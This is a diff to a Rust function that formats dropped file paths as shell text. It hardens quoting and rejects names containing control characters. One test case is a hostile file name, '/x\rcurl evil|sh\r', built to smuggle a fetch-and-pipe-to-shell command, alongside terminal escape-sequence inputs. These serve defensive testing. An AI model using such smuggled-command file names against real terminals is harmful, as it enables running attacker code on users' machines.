@@ -2,49 +2,55 @@
 
 use std::path::PathBuf;
 
-const SPECIAL: [char; 5] = ['"', '\\', '$', '`', '\''];
+const SAFE: &str = "/._-+@:,%=~";
 
-/// The shell text for dropped `paths`: absolute paths only, quoted when they need it, each followed
-/// by a space. Empty when no path qualifies.
+/// The shell text for dropped `paths`: absolute paths only, single-quoted when they need it, each
+/// followed by a space. A name with a control character is skipped: it could type a command.
+/// Empty when no path qualifies.
 pub fn format_dropped_paths(paths: &[PathBuf]) -> String {
     paths
         .iter()
         .filter(|path| path.is_absolute())
         .filter_map(|path| path.to_str())
+        .filter(|path| !path.contains(char::is_control))
         .map(|path| quote(path) + " ")
         .collect()
 }
 
 fn quote(path: &str) -> String {
-    let needs_quotes = path.contains(char::is_whitespace) || path.contains(SPECIAL);
-    if !needs_quotes {
+    let plain = path
+        .chars()
+        .all(|character| character.is_alphanumeric() || SAFE.contains(character));
+    if plain {
         return path.to_owned();
     }
-    let escaped: String = path
-        .chars()
-        .flat_map(|character| {
-            let escape = matches!(character, '"' | '\\' | '$' | '`');
-            escape
-                .then_some('\\')
-                .into_iter()
-                .chain(std::iter::once(character))
-        })
-        .collect();
-    format!("\"{escaped}\"")
+    format!("'{}'", path.replace('\'', "'\\''"))
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
+    const CASES: &[(&str, &str)] = &[
+        ("/a/b.txt", "/a/b.txt "),
+        ("/a b/$c", "'/a b/$c' "),
+        ("/it's", "'/it'\\''s' "),
+        ("/bang!", "'/bang!' "),
+        ("/x\rcurl evil|sh\r", ""),
+        ("/esc\x1b[2J", ""),
+        ("/ctl\x03", ""),
+        ("relative/x", ""),
+    ];
+
     #[test]
-    fn absolute_paths_are_quoted_when_needed() {
-        let paths = [
-            PathBuf::from("/a/b.txt"),
-            PathBuf::from("/a b/$c"),
-            PathBuf::from("relative/x"),
-        ];
-        assert_eq!(format_dropped_paths(&paths), "/a/b.txt \"/a b/\\$c\" ");
+    fn paths_are_single_quoted_when_needed_and_control_characters_are_refused() {
+        for (path, expected) in CASES {
+            assert_eq!(
+                format_dropped_paths(&[PathBuf::from(path)]),
+                *expected,
+                "{path:?}"
+            );
+        }
         assert_eq!(format_dropped_paths(&[]), "");
     }
 }
